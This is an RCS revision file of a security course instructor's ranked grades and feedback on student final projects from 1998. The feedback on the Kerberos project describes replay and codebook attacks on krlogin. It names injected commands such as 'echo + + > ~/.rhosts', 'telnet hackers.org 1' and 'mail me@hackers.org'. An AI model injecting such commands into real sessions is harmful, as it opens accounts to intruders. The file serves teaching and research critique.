head	1.6;
access;
symbols;
locks; strict;
comment	@# @;


1.6
date	98.12.16.19.06.02;	author daw;	state Exp;
branches;
next	1.5;

1.5
date	98.12.16.18.52.55;	author daw;	state Exp;
branches;
next	1.4;

1.4
date	98.12.16.18.34.39;	author daw;	state Exp;
branches;
next	1.3;

1.3
date	98.12.16.05.06.01;	author daw;	state Exp;
branches;
next	1.2;

1.2
date	98.12.16.03.33.48;	author daw;	state Exp;
branches;
next	1.1;

1.1
date	98.12.16.03.14.15;	author daw;	state Exp;
branches;
next	;


desc
@@


1.6
log
@*** empty log message ***
@
text
@I tried to order the project final reports from best to worst,
to capture the relative ordering.

I also tried to assign a score from 50 (very weak) to 100 (superb
research), to try to capture some idea of the variations.

Format is

20  The Case for Windows95 as a Platform for Secure Services / author1,author2
	(comments for the instructors)
	Wow, this paper sucked.  They were totally clueless.
	--
	(comments to the authors)
	The argument for using Microsoft software was shallow and not at all
	compelling.  I suggest further study of Microsoft's track record to
	gain some perspective for the issues.
	Also, you'll need to justify why anyone should trust
	a closed-source computing platform.

Here's my first cut:


100  Sniffer Detection / davidwu@@cs,fredwong@@cs
	Wow!
	--
	Stellar work!  A model project.
	I'd encourage you to turn this into a paper submission; I think
	it'd be a strong candidate for acceptance at a security conference.
	Let me know if you're interested, and I can suggest some possibilities
	and give you comments for improving the paper.
	(And I hope you'll release the code.  It looks useful.)

96  SSL traffic analysis / heyning@@cs,ronathan@@cs
	Nice techniques & algorithms, nice results, nice analysis.
	The results on random padding were a nice bonus.
	--
	Great work!  I'd encourage you to turn this into a paper submission
	(possibly with the other SSL group); with a little bit more work,
	I think you'd have a good shot at getting these results published.

	One of the strong points of this paper was that you used real user
	browsing traces to validate your results.  (It was not clear to me
	how closely the simulation corresponds to real user browsing behavior,
	but the use of real user traces was much more compelling.)

	And the results on random padding were very interesting.

	Regarding your algorithm for taking advantage of the link structure,
	have you considered the following modification to the model?  Let
	p(x,z) be the conditional probability that, if the eavesdropper
	has just observed a visit to page x, the next page-visit he observes
	will be to page z.  (Thus, this event might occur if the user visits
	pages x,y,z in turn, where y is cached but x,z are not.)  If you
	knew this quantity, this would provide an obvious way to extend your
	algorithm to take into account the link structure even when caching
	might be in effect.

	Of course, it is hard to derive p(x,z) in general, but the following
	approximation might be useful.  Let p'(x,y_1,..,y_n,z) be the
	probability that the user next visits the pages y_1,...,y_n,z (in that
	order) given that he just visited page x.  This quantity can be
	easily approximated as P(x->y_1)*P(y_1->y_2)*...*P(y_n->z) where
	P(a->b) is the probability of visiting page b after page a by
	following a link; P(a->b) can be approximated by m/n if page a
	contains a total of n links, m of which point to page b.  Also let
	q be the hit ratio of the cache.  Then we can approximate p(x,z) as
	the sum of p'(x,y_1,..,y_n,z) * q^n * (1-q) over all of the paths
	x,y_1,..,y_n,z in the graph of the link structure which start at
	x and end at z.

	I wonder whether this would improve the identification of pages
	using the link structure.  (On the other hand, your paper showed
	that at least some of the time, using just HTML page sizes is enough
	to get a success rate which is already impressively high, so maybe
	this improvement to the algorithm isn't very interesting.)

96  Pay-per-use services / mikechen@@cs,geweke@@cs
	Research results probably not meaty enough for an academic
	publication, but design, implementation, and writeup were all
	excellent within that limitation.
	--
	Nice work.  The payment systems stuff was a bit weak in research
	quality (mainly, novelty), but the the design, implementation, and
	writeup were all excellent.

85  SSL traffic analysis / shailen@@cs,bhaskar@@cs
	Quite a bit narrower goals than previous project, but very good
	execution of those narrow goals.  Nice results on dynamic web pages.
	--
	Good work.  I'd encourage you to turn this into a paper submission
	(ideally with the other SSL group); you have some very interesting
	results.

	The nice results on dynamic web pages were a strong point of the
	paper; I didn't expect such good recognition rates.

82  Secure hotsync / helenjw@@cs
	Very nice implementation techniques.  Exactly what we'd want from
	a *systems* security class.
	--
	Very nice implementation techniques, especially the bootstrapping
	of policy files as ordinary records which just happened to be the
	first ones backed up.

	I'm surprised you didn't say more on the technique of implementing
	the security layer between DLP and TCP; I'd want to see more to be
	sure, but I suspect this was an insightful design decision which
	saved a lot of work.

80  Kerberos / hildrum@@cs
	Great theoretical results.  Weaknesses were writeup, lack of
	implementation.
	--
	Great!  I'd encourage you to turn this into a paper submission
	(possibly with the other SSL group); more work would be required,
	but I think this is publishable material.
	Let me know if you're interested, and I can suggest some possibilities
	and give you comments for improving the paper.

	Some detailed comments:

	The two main pieces I'd suggest you focus on if you want to turn this
	into a paper submission are (1) implementation and (2) a better
	writeup.  (Implementing the passive codebook attack and the replay
	attack would help validate your results.)  If you want to try to go
	even further, you might try to expand the scope (perhaps check other
	Kerb4 tools (grep?) or even Kerb5) or work on some of the details;
	there's a lot of potential here and a lot of meat, I think.

	A code snippet from where krlogin calls des_write would be nice.

	I would rephrase and rework Sec 2.1.  As I see it, there are at least
	four first-class flaws: (1) the constant IV, (2) unprotected length
	byte, (3) padding with zeros, and (4) no protection against replay
	attacks.  Each one is interesting on its own; together they are
	devastating.
	
	Here's another attack for Sec 2.1 you didn't mention.  If you
	know that $C_0, C_1$ is the encryption of "You have mail", then
	you can use $C_1$ to replay the character $x = 0 \xor C_0[7] \xor
	"l"$, where $C_0[7]$ is the last byte of $C_0$.  Thus, each known
	plaintext/ciphertext pair gives a number of possible characters you
	can replay.

	And yet one more attack for Sec 2.1.  Assuming that most keystrokes
	are sent in one-character packets, this is equivalent to encrypting
	the keystrokes with a simple substitution cipher.  There are lots
	of tricks known for breaking simple substitution ciphers, and I suspect
	you might even be able to do automated cryptanalysis of the ciphertext.
	1. You can probably figure out the encryption of a space just by
	   simple frequency analysis (it's probably the most common letter).
	2. Then you can identify the word breaks.  If you see that the
	   encryption of the first word in some command has the pattern
	   'xyzz', you can deduce that the plaintext is probably 'less',
	   'diff', 'kill', or maybe 'wall' or 'yacc'.  Try e.g.
	      ls /bin /usr/bin | egrep '^..(.)\1$'
	3. You can also use digraph or trigraph frequency analysis.  For
	   instance, in English text, 'th' is one of the most common digraph
	   sequences; if you see 'xy' repeated in the ciphertext a lot, it
	   might be the encryption of 'th'.
	Lots of other techniques are possible.  An implementation of
	*automated* cryptanalysis of Kerberos commands would be awfully
	impressive.  And it would be useful in the key-recovery attack
	(see below).

	The active codebook building attack relies on the fact that krlogin
	uses the same key in both directions.  (Have you checked that?)  This
	is in and of itself a serious flaw worth mentioning.

	For active code book building, note that the email message doesn't
	have to be of such a special form.  If you just eavesdrop on the
	encryption of any known email message of sufficient length, you get
	a lot of information -- each ciphertext block gives you the known
	encryption of a one-letter message.  If you have about 256 known
	ciphertext blocks, you expect most letters to be represented in the
	set of known encryptions.  Then if you want to send the command
	'echo + + > ~/.rhosts', you first send the keystroke 'e' by replaying
	the ciphertext block corresponding to 'e' that you collected above,
	etc.  You piece together the known ciphertexts like kidnappers
	writing a ransom note using letters cut out of magazines.  This
	works because the random padding is ignored by the receiver.
	(This idea is closely related to my short-block attack on IPSEC.)
	Finally, it probably isn't too hard to learn the encryption of some
	known email message -- assuming it is sent unencrypted, it probably
	went out over the wire (by NFS or by SMTP); and you can probably
	tell when the user reads this email message by matching up the lengths
	of messages.

	For the key-recovery attack, note that it becomes trivial if you
	have first built up a known codebook, since this makes it easier
	to do the replay attack and insert a command like
	'telnet hackers.org 1' or 'mail me@@hackers.org' into the victim's
	xterm.  


75  State diagram inspection / gebis@@cs
	Nice idea, but very immature implementation.
	--
	I bought the motivation.  I hope you decide to finish implementing
	the tool; I know I'd find it interesting.  If you do, I'd encourage
	you to write a paper about it.

	(For automatic presentation of state diagrams, you might examine
	AT&T's 'dot' tool for drawing and laying out directed graphs.)

74  Secure multicast / msreedha@@cs,jshih@@cs
	Hierarchical key distribution (ok); epochs with amortized rekeying
	(novel, nice, but small contribution); measurements of signing every
	n-th packet (pretty boring).  A fair amount of work.
	--
	Main contributions: the idea of epochs with amortized rekeying and
	heartbeats for reliability, and a real implementation.  And it falls
	nicely into the intended course's focus of systems security.
	
	I think the chunking technique for authentication can be substantially
	improved.  (I know this wasn't the major focus of the project.)

72  GSM service proxies / chuah@@cs,mds@@eecs
	Neat.  But it was a little shallow.  Writeup was weak.
	Goals were broad, execution was weaker.
	--

72  Secure email proxies / jrvb@@cs,hoon@@cs
	Useful, well-executed, although not much in the way of new insights.
	Main contribution: proxies in the infrastructure are a great way of
	building security, nice implementation.
	Didn't mention areas for possible improvement
	(e.g. having the proxy handle key management for you), didn't mention
	security tradeoffs (e.g. no distinction made between proxy who stores
	your PGP passphrase and one who doesn't).
	--

71  Authentication agents / nikitab@@cs
	Hard to know how to grade this.
	Thorough, well thought out, nicely done; but novelty seems very low.
	This is just an implementation of delegation, with all the usual
	arguments for why to use a smartcard (with a UI), and it's very
	similar to any of a dozen distributed capability systems; but then
	again, it's very well written and well thought out.
	I can't decide whether to give a very high grade for doing such a
	good job re-inventing the wheel, or to give a low grade for reinventing
	the wheel. :-)
	--

70  Secure SDS / czerwin@@cs,ravenben@@cs
	Well, giant goals, execution mediocre.  Nothing on wide-area issues
	or naming issues.  Some concepts seemed muddled.  Administration
	model for access control seems to be another weak point.
	This aimed high, which counts in its favor (it could have been a
	great systems paper if well done), but fell short of its potential,
	which counts against it.
	--
	Lots of comments here.
	
	Strong points: You aimed very high (great!), nice use of standard
	systems techniques (caching, layer of indirection, early/late binding).
	Weak points: Nothing on wide-area issues; secure naming;
	administration model for access control.

	You say primary goal is to ensure SDS doesn't refer you to a
	malicious service.  I say its main goal is to refer you to the service
	most relevant to the name you requested; users are the only ones who
	can tell which servers are malicious (by deciding which "brand names"
	they want to use); computers can't.  This might sound like semantic
	quibbling, but I think the philosophy has broader consequences.
	(e.g. you should focus on naming; access control should be secondary,
	not primary)

	I realize it's probably too early, but I would've liked more detail.
	The primary goal of a SDS is to turn short names into long names
	(and to do so securely).  For example, can you give any examples of
	what a short name might look like?
	One of the big issues is to decide on who controls which parts of
	the namespace.  An insight of DNS is to divide the short names
	up into a hierarchical namespace, though even that has its weaknesses
	(e.g. all the current politics regarding control of .com).  Seems
	like if you want to handle wide-area naming, it's important to have
	a story about these issues.
	On the other hand, SDS has to solve a much harder problem than
	Secure DNS, since you need to be able to handle not just queries
	for exact matches, but also approximate matches.  How do you prove
	to the end user that the approximate match you returned was the
	"best" match?  (You didn't really address this issue in your paper;
	this is subtle, but worth thinking about a little.  Can you do
	anything to reduce trust in the SDS?)

	Access control seemed to be a weak point.  I don't buy that the SDS
	should be in the business of deciding which users should be allowed to
	access a service; its only use of ACLs should be for specifying who
	is allowed to see that service S exists.

	In other words, I shouldn't have to trust the SDS for access control
	to my service.  Imagine I have a Ninja-ized bank account, which I
	contact via authenticated RMI, and suppose the SDS is subverted.  I
	have to expect that if I do a SDS query for "BoA", I might get back
	a malicious server who'll steal (e.g.) my account number; that's
	inherent in the system.  But I don't want someone who subverts the
	SDS to be able to instantly steal all the funds from my bank account;
	and the latter situation could occur if the SDS is responsible for
	access control to services (rather than just access control to the
	list of available services).  This seems to be a big weakness in the
	Capability Manager design.
	
	Also I'm not sure I buy the model for administrative control (i.e.
	who sets the policy) of these ACLs.  Does your design imply a central
	administrator who sets policy on the various services?  If so, wouldn't
	it be cleaner to have "self-administered" policy -- each service makes
	its own decision on who can know of its existence?

	The iSpaceForwarder seems to be a critical system component.  How
	does it gather information about services reliably?  Sounds hard to
	do securely, if you don't assume cooperation from the service.

	I couldn't tell from your description whether the format for
	"secure one-way broadcasts" was secure.  What is signed?  If you
	sign just the key, attacks are possible; if you sign the
	(sender,dest,expiry,key) tuple, it looks much safer.  (And a note
	on terminology: you sign with a private key, not with a certificate.)
	
	Terminology: "hierarchical" and "web of trust" are diametrically
	opposed trust models.  "hierarchical" means you have a tree with a
	globally-trusted root.  "web of trust" means you have an arbitrary
	undirected graph, with no structure imposed.

	I'm a little lost by the RSA/ECB comment.  You should never encrypt
	more than one block of RSA content; it's far too slow.  Instead, use
	a hybrid scheme: pick a random Triple-DES key K, encrypt K using
	RSA, then encrypt your lengthy message using K.

	Your performance numbers were interesting.  I didn't expect Triple-DES
	to be so slow.
	On the other hand, Triple-DES performance might get a lot better with
	e.g. JITs or native method implementations.  But moving to a faster
	algorithm seems reasonable if Triple-DES is too slow.


62  Obfuscation / jmacd@@cs
	Nice survey, but no new results.  Very hard topic, but no new
	results.  Hard to know how to grade something like this.
	--
	Here's a dual of the undetachable program signature problem.
	Let $e,e^{-1}$ be the public-key encryption and decryption transforms,
	and let $p$ be an arbitrary program.  The goal is to build
	$p' = p \circ e^{-1}$ (e.g. decrypt first, then run $p$) in
	a way that $p$ can't be separated from $e^{-1}$.
	For instance, running $p$ on $x,y$ might output $y$ only if
	$x$ takes on a certain fixed pattern; this might be useful for
	e.g. de-multiplexing encrypted streams, where $x$ is header
	information (e.g. port number) and $y$ is payload data.

	Also, note that the "proxy encryption" problem is a special case
	of the undetachable encryption problem.
	The proxy encryption problem:
	  Let $e_X$ denote $X$'s encryption program.  If Alice goes on
	  vacation for a week and wants to let her secretary Bob read her
	  email for a week, she might like to find some proxy transfer
	  function $f$ such that $f(e_A(x)) = e_B(x)$; then $f$ can even
	  be published.  This makes sense for both public-key and
	  symmetric-key cryptosystems.  See
	  ftp://ftp.research.att.com/dist/mab/proxy.ps
	The reduction is trivial: let $f = p' = e_B \circ e_A^{-1}$.

	With undetachable encryption, you can do much more general and
	cool stuff.  For instance, you might imagine writing an automated
	"secretary" who acts as a proxy on your behalf using some AI
	heuristics -- e.g. if the decrypted message contains the string
	"partnership proposal", it might re-encrypt with your business
	partner's public key and forward the result to him.

	Also, I think the "proxy signatures" problem is a special case
	of the undetachable signature problem, but I haven't checked.

	By the way, here is a useful technique for eliminating interaction
	in zero-knowledge proofs, from the folklore.  I wonder whether a
	variation might be useful in the context of program security?
	The trick is this.  Suppose you have an interactive zero-knowledge
	proof-of-identification protocol.  You can build a non-interactive
	signature scheme out of it, like this: you hash the message a bunch
	of times to get some "random" bits, and use them in place of the
	random challenges in the zero-knowledge protocol.  Anyone who could
	verify your identity interactively can now non-interactively verify
	the signature; and a forgery attack on the signature scheme is then
	claimed to imply an impersonation attack on the ZK protocol.

60  Active IDS / pchong@@eecs
	One nice idea (use fragmentation to good effect); very poor
	information on implementation, and only implemented one pretty
	trivial defense; no information on why SYN flooding failed.
	In other words, implementation and analysis was poor.
	--
	Noting that you can use fragmentation to good effect was a nice idea.
	The key idea seems to be that you can stop _gradual_ attacks, but
	not _instant death_ attacks.  This is an interesting characterization
	of what you can and can't do with a Type II IDS.

	Main weak points: implementation and analysis.

	One paragraph seems to confuse TCP and IP fragmentation.  Setting
	the MTU low on an intermediate router will typically cause IP
	fragmentation, not TCP fragmentation (unless both endpoints use
	path MTU discovery).  This is a very minor point.

55  Sniffer detection / dongwu@@eecs
	Not terrible; but very weak on analysis, depth; better than
	I expected from the poster session.
	--
	An improvement over what I saw in the poster session.
	Dynamic detection of the response time threshold is nice.

	But still analysis, depth are weak points.

54  Multicast security / jackchen@@cs
	Not terrible, but weak.  Layering was nice.

	I totally didn't buy his analysis of the strength of various
	RSA key sizes; there were a lot of "and let's assume the enemy
	is 100,000 times more powerful than the worst adversary we can 
	reasonably imagine" type statements, which is exactly the wrong
	thing to do -- needed a very accurate analysis of RSA security,
	not a very loose lower bound.
	Weaker than I expected from the poster session.
	-- 
	Layering idea was nice.

	You missed that you can sign every nth packet and still tolerate
	packet drops if each signed packet contains the n hashes of the
	previous n packets.

	I thought a more precise survey of the security of RSA was called
	for; in this application, if you throw in too much of a fudge factor,
	you can easily conclude that multicast security is impossible.

@


1.5
log
@*** empty log message ***
@
text
@d233 12
@


1.4
log
@*** empty log message ***
@
text
@d372 49
@


1.3
log
@*** empty log message ***
@
text
@d86 25
a110 1
88  Kerberos / hildrum@@cs
d112 1
a112 1
	implementation.  Keep in mind this was a one-person project.
a194 24
86  Secure hotsync / helenjw@@cs
	Very nice implementation techniques.  Exactly what we'd want from
	a *systems* security class.
	Keep in mind this was a one-person project.
	--
	Very nice implementation techniques, especially the bootstrapping
	of policy files as ordinary records which just happened to be the
	first ones backed up.

	I'm surprised you didn't say more on the technique of implementing
	the security layer between DLP and TCP; I'd want to see more to be
	sure, but I suspect this was an insightful design decision which
	saved a lot of work.

85  SSL traffic analysis / shailen@@cs,bhaskar@@cs
	Quite a bit narrower goals than previous project, but very good
	execution of those narrow goals.  Nice results on dynamic web pages.
	--
	Good work.  I'd encourage you to turn this into a paper submission
	(ideally with the other SSL group); you have some very interesting
	results.

	The nice results on dynamic web pages were a strong point of the
	paper; I didn't expect such good recognition rates.
@


1.2
log
@*** empty log message ***
@
text
@d335 3
a337 2
	$x$ takes on a certain fixed value; this might be useful for
	e.g. de-multiplexing encrypted streams.
d339 11
a349 1
	Also, the undet
d351 6
d358 2
a359 13
	Note that the "proxy signatures" problem is a special case of
	the undetachable program signature problem.
	Proxy signatures problem:
	  Let s_X,v_X represent X's signature and verification functions.
	  If Alice goes on vacation for a week and wants to let her secretary
	  Bob sign payroll checks for her, she might like to find some proxy
	  function f which transform Bob-signatures into Alice-signatures so
	  she can give f to Bob.
	
	  [satisfying v_A(x,f(x,s_B(x))) = true for all x] which she
	  can give to Bob.  (Ideally, knowing f and Alice's private key
	  wouldn't disclose Bob's

d361 11
@


1.1
log
@*** empty log message ***
@
text
@d329 12
@
